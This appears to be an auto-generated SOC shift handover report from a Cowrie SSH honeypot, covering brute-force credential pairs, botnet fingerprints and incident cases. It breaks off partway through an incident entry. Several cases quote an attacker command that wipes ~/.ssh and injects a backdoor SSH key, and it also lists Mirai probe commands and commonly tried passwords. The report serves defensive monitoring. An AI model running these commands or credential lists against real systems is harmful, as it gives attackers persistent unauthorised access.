# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-02 |
| **Generated At** | 2026-07-02T21:13:38Z |
| **Shift Time** | 21:13 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **502** |
| Confirmed Threats | **491** |
| False Positives Filtered | **11** (2.2%) |
| Unique Attacker IPs | **55** |
| Countries of Origin | **19** |
| High Severity Cases | **107** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **395** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **159** |
| Unique Credential Pairs | **99** |
| Unique Usernames | **23** |
| Unique Passwords | **80** |
| Successful Auth Pairs | **131** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 70 |
| `345gs5662d34` | 33 |
| `admin` | 13 |
| `ubuntu` | 7 |
| `dss` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 33 |
| `3245gs5662d34` | 31 |
| `admin` | 5 |
| `LeitboGi0ro` | 4 |
| `123456` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 33 |
| `root` | `3245gs5662d34` | 15 |
| `admin` | `admin` | 5 |
| `root` | `LeitboGi0ro` | 4 |
| `root` | `p@ssw0rd` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1312` | `45.198.224.120` | 2026-07-02T18:57:44 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-02T18:58:28 |
| `root` | `password!` | `39.107.33.136` | 2026-07-02T19:01:02 |
| `345gs5662d34` | `345gs5662d34` | `39.107.33.136` | 2026-07-02T19:01:32 |
| `root` | `q123456789Q` | `45.205.1.42` | 2026-07-02T19:01:37 |
| `root` | `Admin#2026` | `171.244.39.95` | 2026-07-02T19:03:05 |
| `345gs5662d34` | `345gs5662d34` | `171.244.39.95` | 2026-07-02T19:03:09 |
| `root` | `3245gs5662d34` | `171.244.39.95` | 2026-07-02T19:03:11 |
| `testuser` | `test1` | `103.182.132.154` | 2026-07-02T19:06:21 |
| `345gs5662d34` | `345gs5662d34` | `103.182.132.154` | 2026-07-02T19:06:25 |
| `testuser` | `3245gs5662d34` | `103.182.132.154` | 2026-07-02T19:06:26 |
| `root` | `unitrends1` | `109.91.4.177` | 2026-07-02T19:07:54 |
| `345gs5662d34` | `345gs5662d34` | `109.91.4.177` | 2026-07-02T19:07:56 |
| `root` | `3245gs5662d34` | `109.91.4.177` | 2026-07-02T19:07:57 |
| `root` | `12345678` | `45.198.224.120` | 2026-07-02T19:09:18 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-02T19:10:54 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-02T19:10:54 |
| `etu` | `etu` | `10.0.0.73` | 2026-07-02T19:15:09 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-02T19:15:13 |
| `etu` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T19:15:15 |
| `root` | `qwer123` | `45.205.1.42` | 2026-07-02T19:15:40 |
| `calypso` | `calypso123` | `10.0.0.73` | 2026-07-02T19:17:18 |
| `calypso` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T19:17:22 |
| `admin` | `admin` | `45.148.10.121` | 2026-07-02T19:17:31 |
| `root` | `qwer@123$%^` | `51.75.247.232` | 2026-07-02T19:17:34 |
| `345gs5662d34` | `345gs5662d34` | `51.75.247.232` | 2026-07-02T19:17:36 |
| `root` | `3245gs5662d34` | `51.75.247.232` | 2026-07-02T19:17:37 |
| `root` | `` | `94.154.43.57` | 2026-07-02T19:18:13 |
| `dss` | `dss123` | `10.0.0.73` | 2026-07-02T19:20:59 |
| `a1` | `a1` | `45.198.224.120` | 2026-07-02T19:21:01 |
| `dss` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T19:21:16 |
| `rob` | `rob` | `10.0.0.73` | 2026-07-02T19:25:50 |
| `root` | `JGAFH9cBC0` | `106.52.169.134` | 2026-07-02T19:25:53 |
| `rob` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T19:25:56 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-02T19:26:51 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-02T19:26:51 |
| `root` | `letmein` | `139.99.74.35` | 2026-07-02T19:26:53 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-02T19:26:59 |
| `root` | `test123` | `139.99.74.35` | 2026-07-02T19:27:45 |
| `root` | `A123456789b` | `203.200.74.18` | 2026-07-02T19:28:20 |
| `345gs5662d34` | `345gs5662d34` | `203.200.74.18` | 2026-07-02T19:28:24 |
| `root` | `3245gs5662d34` | `203.200.74.18` | 2026-07-02T19:28:26 |
| `ubuntu` | `Admin@9000` | `45.205.1.42` | 2026-07-02T19:29:46 |
| `root` | `Welcome!@#` | `180.93.172.213` | 2026-07-02T19:30:53 |
| `345gs5662d34` | `345gs5662d34` | `180.93.172.213` | 2026-07-02T19:30:59 |
| `root` | `3245gs5662d34` | `180.93.172.213` | 2026-07-02T19:31:02 |
| `root` | `root123` | `139.99.74.35` | 2026-07-02T19:31:03 |
| `root` | `p@ssw0rd` | `185.242.3.195` | 2026-07-02T19:31:11 |
| `root` | `admin888` | `139.99.74.35` | 2026-07-02T19:32:56 |
| `wangxin1` | `wangxin1` | `45.198.224.120` | 2026-07-02T19:33:04 |
| `val` | `val` | `10.0.0.73` | 2026-07-02T19:33:30 |
| `val` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T19:33:36 |
| `root` | `system` | `139.99.74.35` | 2026-07-02T19:33:53 |
| `root` | `ubuntu123` | `139.99.74.35` | 2026-07-02T19:34:39 |
| `root` | `mongodb` | `139.99.74.35` | 2026-07-02T19:36:21 |
| `admin` | `123456` | `139.99.74.35` | 2026-07-02T19:40:52 |
| `admin` | `changeme` | `139.99.74.35` | 2026-07-02T19:42:24 |
| `admin` | `1234` | `139.99.74.35` | 2026-07-02T19:43:13 |
| `root` | `2024` | `45.205.1.42` | 2026-07-02T19:43:40 |
| `root` | `R6jT6kfs` | `45.198.224.120` | 2026-07-02T19:44:43 |
| `admin01` | `123456` | `138.124.69.150` | 2026-07-02T19:45:13 |
| `345gs5662d34` | `345gs5662d34` | `138.124.69.150` | 2026-07-02T19:45:16 |
| `admin01` | `3245gs5662d34` | `138.124.69.150` | 2026-07-02T19:45:17 |
| `root` | `Lz123456` | `163.227.52.50` | 2026-07-02T19:45:45 |
| `345gs5662d34` | `345gs5662d34` | `163.227.52.50` | 2026-07-02T19:45:50 |
| `root` | `3245gs5662d34` | `163.227.52.50` | 2026-07-02T19:45:52 |
| `admin` | `default` | `139.99.74.35` | 2026-07-02T19:45:53 |
| `root` | `100200300` | `10.0.0.73` | 2026-07-02T19:46:20 |
| `root` | `Pass2025` | `10.0.0.73` | 2026-07-02T19:46:22 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T19:46:26 |
| `admin` | `vpsadmin` | `139.99.74.35` | 2026-07-02T19:46:38 |
| `root` | `Zaq!Xsw` | `212.112.19.163` | 2026-07-02T19:47:03 |
| `root` | `Admin2024!` | `134.209.186.182` | 2026-07-02T19:48:11 |
| `345gs5662d34` | `345gs5662d34` | `134.209.186.182` | 2026-07-02T19:48:13 |
| `root` | `3245gs5662d34` | `134.209.186.182` | 2026-07-02T19:48:14 |
| `root` | `System1234` | `10.0.0.73` | 2026-07-02T19:49:41 |
| `admin` | `debian` | `139.99.74.35` | 2026-07-02T19:49:46 |
| `es` | `es` | `154.221.20.92` | 2026-07-02T19:51:42 |
| `345gs5662d34` | `345gs5662d34` | `154.221.20.92` | 2026-07-02T19:51:46 |
| `es` | `3245gs5662d34` | `154.221.20.92` | 2026-07-02T19:51:47 |
| `adminftp` | `adminftp` | `190.167.237.191` | 2026-07-02T19:52:06 |
| `admin` | `TempPass` | `139.99.74.35` | 2026-07-02T19:52:07 |
| `345gs5662d34` | `345gs5662d34` | `190.167.237.191` | 2026-07-02T19:52:07 |
| `adminftp` | `3245gs5662d34` | `190.167.237.191` | 2026-07-02T19:52:08 |
| `root` | `roots` | `13.94.39.162` | 2026-07-02T19:52:18 |
| `user` | `Qwer!234` | `186.38.26.5` | 2026-07-02T19:52:48 |
| `345gs5662d34` | `345gs5662d34` | `186.38.26.5` | 2026-07-02T19:52:52 |
| `user` | `3245gs5662d34` | `186.38.26.5` | 2026-07-02T19:52:53 |
| `admin` | `server` | `139.99.74.35` | 2026-07-02T19:53:30 |
| `345gs5662d34` | `345gs5662d34` | `13.94.39.162` | 2026-07-02T19:54:12 |
| `root` | `qweasdpoilkj` | `45.198.224.120` | 2026-07-02T19:56:58 |
| `root` | `Yo123456789` | `10.0.0.73` | 2026-07-02T19:57:00 |
| `root` | `Oracle!@#456` | `45.205.1.42` | 2026-07-02T19:57:51 |
| `root` | `100dedi@` | `117.218.75.251` | 2026-07-02T19:58:12 |
| `345gs5662d34` | `345gs5662d34` | `117.218.75.251` | 2026-07-02T19:58:16 |
| `root` | `3245gs5662d34` | `117.218.75.251` | 2026-07-02T19:58:18 |
| `ubuntu` | `welcome1` | `139.99.74.35` | 2026-07-02T19:59:17 |
| `root` | `Huawei@2024` | `10.0.0.73` | 2026-07-02T19:59:50 |
| `ubuntu` | `adminadmin` | `139.99.74.35` | 2026-07-02T20:01:47 |
| `defender` | `defender123` | `45.157.156.222` | 2026-07-02T20:02:03 |
| `345gs5662d34` | `345gs5662d34` | `45.157.156.222` | 2026-07-02T20:02:06 |
| `defender` | `3245gs5662d34` | `45.157.156.222` | 2026-07-02T20:02:07 |
| `ubuntu` | `admin1` | `139.99.74.35` | 2026-07-02T20:02:38 |
| `root` | `r3al1ty` | `10.0.0.73` | 2026-07-02T20:04:00 |
| `ubuntu` | `TempPass` | `139.99.74.35` | 2026-07-02T20:05:47 |
| `root` | `kristy` | `10.0.0.73` | 2026-07-02T20:07:54 |
| `ubuntu` | `root@` | `139.99.74.35` | 2026-07-02T20:07:59 |
| `root` | `Password@12` | `45.198.224.120` | 2026-07-02T20:09:15 |
| `root` | `p@ssw0rd` | `10.0.0.73` | 2026-07-02T20:11:35 |
| `root` | `P@ssw0rd2011` | `45.205.1.42` | 2026-07-02T20:12:05 |
| `root` | `Ym123456` | `10.0.0.73` | 2026-07-02T20:13:01 |
| `root` | `qazwsxedc123` | `45.198.224.120` | 2026-07-02T20:21:52 |
| `solar` | `solar` | `10.0.0.73` | 2026-07-02T20:22:28 |
| `solar` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T20:22:32 |
| `sarg` | `sarg123` | `10.0.0.73` | 2026-07-02T20:23:40 |
| `ubuntu` | `Aa123456` | `45.205.1.42` | 2026-07-02T20:26:19 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-07-02T20:30:51 |
| `root` | `letmein` | `45.198.224.120` | 2026-07-02T20:33:56 |
| `admin` | `admin` | `47.95.234.23` | 2026-07-02T20:38:01 |
| `spike` | `123456` | `72.253.251.7` | 2026-07-02T20:38:08 |
| `345gs5662d34` | `345gs5662d34` | `72.253.251.7` | 2026-07-02T20:38:11 |
| `spike` | `3245gs5662d34` | `72.253.251.7` | 2026-07-02T20:38:12 |
| `sql` | `sql123` | `10.0.0.73` | 2026-07-02T20:38:30 |
| `sql` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T20:38:35 |
| `yegu` | `yegu` | `45.205.1.42` | 2026-07-02T20:40:20 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-07-02T20:41:37 |
| `wwa` | `123456` | `103.191.92.72` | 2026-07-02T20:43:17 |
| `345gs5662d34` | `345gs5662d34` | `103.191.92.72` | 2026-07-02T20:43:22 |
| `wwa` | `3245gs5662d34` | `103.191.92.72` | 2026-07-02T20:43:23 |
| `root` | `qaz1wsx2123` | `45.198.224.120` | 2026-07-02T20:45:38 |
| `root` | `server1` | `45.205.1.42` | 2026-07-02T20:54:31 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **502** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 67 |
| Go SSH scanner | 48 |
| Paramiko (Python) | 8 |
| Perl Net::SSH | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 54 | 19 |
| `16443846184e...` | Generic scanner | 42 | 5 |
| `a2de0f306611...` | Mirai/variant | 8 | 2 |
| `4e066189c3bb...` | Generic scanner | 3 | 1 |
| `bf7dbf67fa9b...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 54 | 19 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 42 | 5 | Generic scanner |
| `95420f9d932d...` | libssh | 12 | 6 | — |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `bf7dbf67fa9b...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 17 | 17 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.57`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `190.167.237.191`, `171.244.39.95`, `186.38.26.5`, `72.253.251.7`, `51.75.247.232`, `163.227.52.50`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **55** |
| Unique ASNs | **2** |
| High-Risk ASNs | **2** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 54 | HIGH |
| `AS55081` | 24 SHELLS | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (107)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-df1bdaaffd39

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 18:57 |
| **Last Seen** | 2026-07-02 18:57 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:57:36` | `cowrie.session.connect` |
| `2026-07-02 18:57:38` | `cowrie.client.version` |
| `2026-07-02 18:57:38` | `cowrie.client.kex` |
| `2026-07-02 18:57:44` | `cowrie.login.success` |
| `2026-07-02 18:57:47` | `cowrie.session.params` |
| `2026-07-02 18:57:47` | `cowrie.command.input` |
| `2026-07-02 18:57:49` | `cowrie.log.closed` |
| `2026-07-02 18:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9ef37954149

| Field | Detail |
|---|---|
| **Source IP** | `39.107.33[.]136` |
| **First Seen** | 2026-07-02 19:01 |
| **Last Seen** | 2026-07-02 19:06 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:01:01` | `cowrie.session.connect` |
| `2026-07-02 19:01:01` | `cowrie.client.version` |
| `2026-07-02 19:01:01` | `cowrie.client.kex` |
| `2026-07-02 19:01:02` | `cowrie.login.success` |
| `2026-07-02 19:06:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.107.33[.]136` to AbuseIPDB if not already reported
- [ ] Block `39.107.33[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c8fe5d6a7a5

| Field | Detail |
|---|---|
| **Source IP** | `39.107.33[.]136` |
| **First Seen** | 2026-07-02 19:01 |
| **Last Seen** | 2026-07-02 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:01:31` | `cowrie.session.connect` |
| `2026-07-02 19:01:31` | `cowrie.client.version` |
| `2026-07-02 19:01:31` | `cowrie.client.kex` |
| `2026-07-02 19:01:32` | `cowrie.login.success` |
| `2026-07-02 19:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.107.33[.]136` to AbuseIPDB if not already reported
- [ ] Block `39.107.33[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dded8b72d8a2

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 19:01 |
| **Last Seen** | 2026-07-02 19:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:01:35` | `cowrie.session.connect` |
| `2026-07-02 19:01:35` | `cowrie.client.version` |
| `2026-07-02 19:01:35` | `cowrie.client.kex` |
| `2026-07-02 19:01:37` | `cowrie.login.success` |
| `2026-07-02 19:01:39` | `cowrie.session.params` |
| `2026-07-02 19:01:39` | `cowrie.command.input` |
| `2026-07-02 19:01:40` | `cowrie.log.closed` |
| `2026-07-02 19:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-567667508e9c

| Field | Detail |
|---|---|
| **Source IP** | `171.244.39[.]95` |
| **First Seen** | 2026-07-02 19:03 |
| **Last Seen** | 2026-07-02 19:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:03:04` | `cowrie.session.connect` |
| `2026-07-02 19:03:04` | `cowrie.client.version` |
| `2026-07-02 19:03:04` | `cowrie.client.kex` |
| `2026-07-02 19:03:05` | `cowrie.login.success` |
| `2026-07-02 19:03:06` | `cowrie.session.params` |
| `2026-07-02 19:03:06` | `cowrie.command.input` |
| `2026-07-02 19:03:06` | `cowrie.command.failed` |
| `2026-07-02 19:03:07` | `cowrie.log.closed` |
| `2026-07-02 19:03:08` | `cowrie.session.params` |
| `2026-07-02 19:03:08` | `cowrie.command.input` |
| `2026-07-02 19:03:08` | `cowrie.session.file_download` |
| `2026-07-02 19:03:08` | `cowrie.log.closed` |
| `2026-07-02 19:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.39[.]95` to AbuseIPDB if not already reported
- [ ] Block `171.244.39[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-469a8569f731

| Field | Detail |
|---|---|
| **Source IP** | `171.244.39[.]95` |
| **First Seen** | 2026-07-02 19:03 |
| **Last Seen** | 2026-07-02 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:03:08` | `cowrie.session.connect` |
| `2026-07-02 19:03:08` | `cowrie.client.version` |
| `2026-07-02 19:03:08` | `cowrie.client.kex` |
| `2026-07-02 19:03:09` | `cowrie.login.success` |
| `2026-07-02 19:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.39[.]95` to AbuseIPDB if not already reported
- [ ] Block `171.244.39[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-034807001d97

| Field | Detail |
|---|---|
| **Source IP** | `171.244.39[.]95` |
| **First Seen** | 2026-07-02 19:03 |
| **Last Seen** | 2026-07-02 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:03:10` | `cowrie.session.connect` |
| `2026-07-02 19:03:10` | `cowrie.client.version` |
| `2026-07-02 19:03:10` | `cowrie.client.kex` |
| `2026-07-02 19:03:11` | `cowrie.login.success` |
| `2026-07-02 19:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.39[.]95` to AbuseIPDB if not already reported
- [ ] Block `171.244.39[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca981a4a13c

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-07-02 19:06 |
| **Last Seen** | 2026-07-02 19:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:06:20` | `cowrie.session.connect` |
| `2026-07-02 19:06:20` | `cowrie.client.version` |
| `2026-07-02 19:06:20` | `cowrie.client.kex` |
| `2026-07-02 19:06:21` | `cowrie.login.success` |
| `2026-07-02 19:06:22` | `cowrie.session.params` |
| `2026-07-02 19:06:22` | `cowrie.command.input` |
| `2026-07-02 19:06:22` | `cowrie.command.failed` |
| `2026-07-02 19:06:22` | `cowrie.log.closed` |
| `2026-07-02 19:06:23` | `cowrie.session.params` |
| `2026-07-02 19:06:23` | `cowrie.command.input` |
| `2026-07-02 19:06:23` | `cowrie.session.file_download` |
| `2026-07-02 19:06:23` | `cowrie.log.closed` |
| `2026-07-02 19:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4bb1b43a988

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-07-02 19:06 |
| **Last Seen** | 2026-07-02 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:06:24` | `cowrie.session.connect` |
| `2026-07-02 19:06:24` | `cowrie.client.version` |
| `2026-07-02 19:06:24` | `cowrie.client.kex` |
| `2026-07-02 19:06:25` | `cowrie.login.success` |
| `2026-07-02 19:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72316bbee87d

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-07-02 19:06 |
| **Last Seen** | 2026-07-02 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:06:25` | `cowrie.session.connect` |
| `2026-07-02 19:06:25` | `cowrie.client.version` |
| `2026-07-02 19:06:25` | `cowrie.client.kex` |
| `2026-07-02 19:06:26` | `cowrie.login.success` |
| `2026-07-02 19:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-936b71ed031d

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-07-02 19:07 |
| **Last Seen** | 2026-07-02 19:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
